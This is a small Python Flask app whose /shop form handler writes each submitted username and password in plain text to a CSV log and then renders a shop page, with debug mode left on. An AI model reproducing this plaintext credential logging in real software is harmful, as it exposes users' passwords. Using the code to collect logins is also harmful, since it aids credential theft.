from flask import Flask, render_template, request

app = Flask(__name__)


def log_user_data(name:str, pswd:str):
    user_name = 'Username: ' + name
    user_pswd = 'Password: ' + pswd
    with open("userInput.csv", "a") as log:
        print(user_name, user_pswd, file=log, sep=" | ")


@app.route('/')
def render_landing_page():
    return render_template('landing_page.html')


@app.route('/shop', methods=["post"])
def render_shop_page():
    username = request.form['user_name']
    password = request.form['user_password']
    log_user_data(username,password)
    return render_template('index.html', customer=username)





if __name__ == '__main__':
    app.run(debug=True)